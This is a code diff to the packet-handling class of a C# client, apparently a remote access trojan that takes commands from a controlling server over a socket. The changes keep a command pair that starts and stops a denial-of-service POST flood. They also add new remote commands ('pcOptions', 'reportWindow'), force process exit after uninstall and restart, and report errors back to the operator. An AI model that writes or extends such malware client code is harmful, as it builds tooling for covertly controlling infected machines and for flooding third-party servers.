@@ -14,7 +14,8 @@ namespace Client.Handle_Packet
 {
     public static class Packet
     {
-        public static CancellationTokenSource cts;
+        public static CancellationTokenSource ctsDos;
+        public static CancellationTokenSource ctsReportWindow;
         public static FormChat GetFormChat;
 
         public static void Read(object data)
@@ -86,6 +87,7 @@ namespace Client.Handle_Packet
                             }
                             catch { }
                             Methods.ClientExit();
+                            Environment.Exit(0);
                             break;
                         }
 
@@ -99,6 +101,7 @@ namespace Client.Handle_Packet
                             catch { }
                             Process.Start(Application.ExecutablePath);
                             Methods.ClientExit();
+                            Environment.Exit(0);
                             break;
                         }
 
@@ -247,14 +250,14 @@ namespace Client.Handle_Packet
                                 case "postStart":
                                     {
                                         HandleDos handleDos = new HandleDos();
-                                        cts = new CancellationTokenSource();
+                                        ctsDos = new CancellationTokenSource();
                                         handleDos.DosPost(unpack_msgpack);
                                         break;
                                     }
 
                                 case "postStop":
                                     {
-                                        cts.Cancel();
+                                        ctsDos.Cancel();
                                         break;
                                     }
                             }
@@ -291,15 +294,38 @@ namespace Client.Handle_Packet
                             new HandlerChat().ExitChat();
                             break;
                         }
+
+                    case "pcOptions":
+                        {
+                            new HandlePcOptions(unpack_msgpack.ForcePathObject("Option").AsString);
+                            break;
+                        }
+
+                    case "reportWindow":
+                        {
+                            new HandleReportWindow(unpack_msgpack);
+                            break;
+                        }
                 }
             }
-            catch { }
+            catch (Exception ex)
+            {
+                Error(ex);
+            }
         }
 
         private static void Received()
         {
             MsgPack msgpack = new MsgPack();
             msgpack.ForcePathObject("Packet").AsString = "Received";
+            ClientSocket.Send(msgpack.Encode2Bytes());
+        }
+
+        public static void Error(Exception ex)
+        {
+            MsgPack msgpack = new MsgPack();
+            msgpack.ForcePathObject("Packet").AsString = "Error";
+            msgpack.ForcePathObject("Error").AsString = ex.Message;
             ClientSocket.Send(msgpack.Encode2Bytes());
         }
 
